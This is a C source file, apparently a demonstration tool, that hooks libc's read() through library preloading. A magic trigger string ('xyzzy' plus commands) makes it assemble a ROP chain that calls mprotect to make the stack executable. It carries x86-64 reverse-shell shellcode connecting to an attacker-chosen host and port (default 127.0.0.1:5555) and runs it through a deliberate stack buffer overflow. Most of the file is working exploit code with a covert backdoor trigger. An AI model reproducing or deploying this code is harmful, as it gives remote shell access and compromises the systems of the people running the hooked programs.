#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netdb.h>
#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static const unsigned char tEncode64[64] = {
	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
	'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'
};

static size_t encode64(const unsigned char *s256, const size_t n256, unsigned char *s64, size_t m64) {

	// Calculate encoded size but limit to size of our output buffer
	size_t n64 = 4 * ((n256 + 2) / 3);
	if (n64 > m64)
		n64 = m64;

	// Loop over input data generating four 6-in-8 bytes for each three 8-in-8 bytes
	for (size_t i256 = 0, i64 = 0, triple = 0; i256 < n256 && i64 < n64;) {
		for (size_t i = 0; i < 3; i++)
			triple = (triple << 8) + ((i256 < n256 ) ? s256[i256++] : 0);

		for (size_t i = 0; i < 4; i++)
			s64[i64++] = tEncode64[(triple >> ((3 - i) * 6)) & (1 << 6) - 1];
	} // for

	// Back-patch trailing overrun created by the "chunky" encoder (above).
	for (size_t i = 0; i < (n256 * 2) % 3; i++)
		s64[n64 - 1 - i] = '=';

	return n64;
} // encode64()

static const unsigned char tDecode64[256] = {
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
	52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
	64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
	15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
	64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
	41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

static size_t length64(const unsigned char *s64) {
	for (size_t i = 0; ; i++)
		if (tDecode64[s64[i]] >  63)
			return i;
} // length64()

static size_t decode64(const unsigned char *s64, const size_t n64, unsigned char *s256, const size_t m256) {

	// Calculate decoded size but limit to size of our output buffer
	size_t n256 = (((n64 + 3) / 4) * 3) - ((4 - n64) & 3);

	// Don't write more than m256 bytes
	if (n256 > m256)
		n256 = m256;

	// Loop over input data generating three 8-in-8 bytes for each four 6-in-8 bytes
	for (size_t i64 = 0, i256 = 0; i64 < n64 && i256 < n256; i64++) {
		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 2 | tDecode64[s64[i64 + 1]] >> 4); i64++; }
		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 4 | tDecode64[s64[i64 + 1]] >> 2); i64++; }
		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 6 | tDecode64[s64[i64 + 1]] >> 0); i64++; }
	} // for

	// Append a NUL if there is room to do so (but don't count it as a decoded character)
	if (n256 < m256)
		s256[n256] = '\0';

	return n256;
} // decode64()

typedef void *Pointer;

typedef struct Offset {
	long	r : 48;
	char	b : 8;
	char	f : 8;
} Offset, *OffsetPtr;

typedef union AddressUnion {
	Pointer	p;
	Offset	o;
	char	c[8];
} AddressUnion, *AddressUnionPtr;

typedef struct in_addr IPAddress, *IPAddressPtr;

typedef struct ShellCode {
	unsigned char	prolog[18];
	unsigned short	port;
	IPAddress	ipAddress;
	unsigned char	epilog[50];
	unsigned short	unused;
} ShellCode, *ShellCodePtr;

typedef union ShellCodeUnion {
	unsigned char	raw[76];
	ShellCode	sc; 
} ShellCodeUnion, *ShellCodeUnionPtr;

typedef struct Payload {
	char		pl_dst[8];
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;
	AddressUnion	pl_shellCode;
	ShellCodeUnion	pl_scu;
} Payload, *PayloadPtr;

static const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};

static const char *s_magic = "xyzzy";

static const char *s_makeload = "MAKELOAD";
static const char *s_dumpload = "DUMPLOAD";
static const char *s_testload = "TESTLOAD";
static const char *s_overflow = "OVERFLOW";

static const char *s_libc_base     = "base";
static const char *s_libc_mprotect = "mprotect";
static const char *s_libc_read     = "read";

static Payload payload = {
	.pl_scu = {
		.raw = {
			0x6a, 0x29,					// pushq	$0x29
			0x58,						// pop		%rax
			0x99, 						// cltd
			0x6a, 0x02,					// pushq	$0x2
			0x5f,						// pop		%rdi
			0x6a, 0x01, 					// pushq	$0x1
			0x5e,						// pop		%rsi
			0x0f, 0x05,					// syscall
			0x48, 0x97,					// xchg		%rax,%rdi
			0x48, 0xb9, 0x02, 0x00,				// movabs	$0x100007fb3150002,%rcx
			0x15, 0xb3,					// .WORD	htons(5555)
			0x7f, 0x00, 0x00, 0x01,				// .DWORD	127.0.0.1
			0x51,						// push		%rcx
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x6a, 0x10,					// pushq	$0x10
			0x5a,						// pop		%rdx
			0x6a, 0x2a,					// pushq	$0x2a
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x6a, 0x03,					// pushq	$0x3
			0x5e,						// pop		%rsi
			0x48, 0xff, 0xce,				// dec		%rsi
			0x6a, 0x21,					// pushq	$0x21
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x75, 0xf6,					// jne		27<dup2_loop>
			0x6a, 0x3b,					// pushq	$0x3b
			0x58,						// pop		%rax
			0x99,						// cltd
			0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,	// movabs	$0x68732f6e69622f,%rbx
			0x73, 0x68, 0x00,				//
			0x53,						// push		%rbx
			0x48, 0x89, 0xe7,				// mov		%rsp,%rdi
			0x52,						// push		%rdx
			0x57,						// push		%rdi
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x0f, 0x05					// syscall
		}
	}
};

_Bool initialized = 0;

ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
Pointer libc_mprotect					= NULL;
Pointer libc_base					= NULL;
Pointer pie_base					= NULL;
Pointer stack_base					= NULL;
Pointer buffer_base					= NULL;

static Pointer pageBase(Pointer p) {
	return (Pointer) (((unsigned long) p) & (-1^getpagesize()-1));
} // pageBase()

static Pointer elfBase(Pointer p) {
	p = pageBase(p);
	while (strncmp(p, s_elf_signature, strlen(s_elf_signature))) {
		p -= getpagesize();
	} // while

	return p;
} // elfBase()

static Pointer stackPage(void) {
	int dummy = 0;

	return pageBase(&dummy);
} // stackBase()

static void initialize(void)
{
	if (!initialized)
	{
		libc_read	= dlsym(RTLD_NEXT, s_libc_read);
		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
		libc_base	= elfBase(libc_mprotect);

		pie_base	= elfBase(initialize);

		stack_base	= stackPage();

		//initialized = 1;
	} // if

	return;
} // initialize()

static Pointer baseAddress(char base) {
	switch (base) {
		case 'B' : return buffer_base;
		case 'L' : return libc_base;
		case 'S' : return stack_base; // Actually just base of current stack page
		case 'X' : return pie_base;
		default  : return 0;
	} // switch
} // baseAddress()

static inline Offset pointerToOffset(Pointer p, char base) {
	return (Offset) { (p - baseAddress(base)), base, '~' };
} // pointerToOffset()

static inline Offset indirectToOffset(Pointer p, char base) {
	return (Offset) { (p - baseAddress(base)), base, '*' };
} // indirectToOffset()

static inline Pointer offsetToPointer(Offset o) {
	return (Pointer) (o.r + baseAddress(o.b));
} // offsetToPointer()

static inline Pointer offsetToIndirect(Offset o) {
	return *((Pointer *) offsetToPointer(o));
} // offsetToIndirect()

static AddressUnion fixupAddressUnion(AddressUnion au) {
	if (au.o.f == '~')
		return (AddressUnion) { .p = offsetToPointer(au.o) };

	if (au.o.f == '*')
		return (AddressUnion) { .p = offsetToIndirect(au.o) };

	return (AddressUnion) { .p = (Pointer) (unsigned long) au.o.r };
} // fixupAddressUnion()

static int lookupHostName(char *hostName , char *ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ((he = gethostbyname(hostName)) == NULL) 
    {
        herror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;
     
    for(i = 0; addr_list[i] != NULL; i++) 
    {
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
     
    return 1;
}

static void makeload(PayloadPtr plp) {
	printf("In makeload()\n");

	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;

	// Offsets are relative to the payload
	buffer_base		= plp;

	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));

	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B');
	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B');
	plp->pl_popRDI.o	= pointerToOffset(&&l_poprdi, 'X');
	plp->pl_stackPage.o	= pointerToOffset(stack_base, 'S');
	plp->pl_popRSI.o	= pointerToOffset(&&l_poprsi, 'X');
	plp->pl_stackSize	= getpagesize();
	plp->pl_popRDX.o	= pointerToOffset(&&l_poprdx, 'X');
	plp->pl_permission	= 0x7;
	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L');

	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B');

	plp->pl_scu.sc.port     = htons(5555);
	if (!inet_aton("127.0.0.1", &plp->pl_scu.sc.ipAddress))
		assert(0); // This should ALWAYS work.

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

	// Gadget for "POP RDI"
	if (v) {
l_poprdi:
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	}

	// Gadget for "POP RSI"
	if (v) {
l_poprsi:
		__asm__ ("pop %rsi");
		__asm__ ("ret");
	}

	// Gadget for "POP RDX"
	if (v) {
l_poprdx:
		__asm__ ("pop %rdx");
		__asm__ ("ret");
	}

	return;
} // makeload()

static void dumpload(PayloadPtr plp) {
	printf("In dumpload()\n");

	printf("--------------------------------------------\n");
	printf("%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
	printf("%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
	printf("%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
	printf("%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
	printf("%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
	printf("%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
	printf("%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
	printf("%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
	printf("%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
	printf("%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
	printf("%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
	printf("%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
	printf("--------------------------------------------\n");
} // dumpload()

static void doFixups(PayloadPtr plp) {
	printf("In doFixups()\n");

	plp->pl_canary    = fixupAddressUnion(plp->pl_canary);
	plp->pl_rbp       = fixupAddressUnion(plp->pl_rbp);
	plp->pl_popRDI    = fixupAddressUnion(plp->pl_popRDI);
	plp->pl_stackPage = fixupAddressUnion(plp->pl_stackPage);
	plp->pl_popRSI    = fixupAddressUnion(plp->pl_popRSI);
	plp->pl_popRDX    = fixupAddressUnion(plp->pl_popRDX);
	plp->pl_mprotect  = fixupAddressUnion(plp->pl_mprotect);
        plp->pl_shellCode = fixupAddressUnion(plp->pl_shellCode); // Be sure that buffer_base is set by now.
} // doFixups()

static void overflow(Pointer src, size_t n) {
	char dst[8] = {0};

	printf("In overflow()\n");

	// Fixups
	buffer_base = &dst;
dumpload((PayloadPtr) src);
	doFixups((PayloadPtr) src);
dumpload((PayloadPtr) src);

	memcpy(dst, src, n);
} // overflow()

ssize_t read(int fd, void *buf, size_t count) {
	initialize();
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);

	if (p)
	{
		p += strlen(s_magic);
		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);
			makeload(&payload);

			// Parse the stuff after MAKELOAD into s_host:port
			int nc, ns;
			char s_host[256];
			unsigned short port;

			ns = sscanf(p, "%n%255[^: ]%n:%hu%n", &nc, s_host, &nc, &port, &nc);
	 		assert(ns >= 0 && ns <= 2);
			
			// Set the port to whatever we got from the sscanf (store it in host endian order)
			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);

			// First we'll see if the s_host string can be parsed by inet_aton()
			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0) {
				struct hostent *he;

				// Next we'll see if s_host can be resolved by DNS
				if ((he = gethostbyname(s_host))) {
					struct in_addr **addressList = (struct in_addr **) he->h_addr_list;

					for (int i = 0; addressList[i] != NULL; i++)
 						payload.pl_scu.sc.ipAddress = *addressList[i];
				} // if
			} // if

			// Generate the payload that we will "echo" back
                        unsigned char sPayload64[4096];
                        size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));

			// Make room for the payload (where the request used to be).
                        char *src = p + nc;
                        char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
			int delta = dst - src;
                        memmove(dst, src, delta);

			// Replace s_makeload with s_overflow
			memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
			p += strlen(s_overflow) - strlen(s_makeload);

			// Place the payload in the newly created space
                        memcpy(p, sPayload64, nPayload64);

			// Adjust the number of characters read
                        result += delta;

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
                        ((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload);
		else if (!strncmp(s_testload, p, strlen(s_testload))) {
			overflow((Pointer)&payload, sizeof(payload));
		}
		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
                        size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
                        overflow(p, n256);
		} // else if
	} // if

	return result;
} // read()

#ifdef REDHOOK_MAIN
int main(int argc, char **argv)
{
	assert(sizeof(short) == 2);
	assert(sizeof(int) == 4);
	assert(sizeof(long) == 8);
	assert(sizeof(void *) == 8);
	assert(sizeof(Pointer) == 8);
	assert(sizeof(ptrdiff_t) == 8);
	assert(sizeof(Offset) == 8);
	assert(sizeof(AddressUnion) == 8);
	assert(sizeof(IPAddress) == 4);
	assert(sizeof(ShellCodeUnion) == 76);
	assert(getpagesize() == 4096);
	assert((-1^(getpagesize()-1))==0xfffffffffffff000);

	printf("Running as an executable\n");
        initialize();
        makeload(&payload);
        dumpload(&payload);
        overflow((char *) &payload, sizeof(payload));
} // main()
#endif
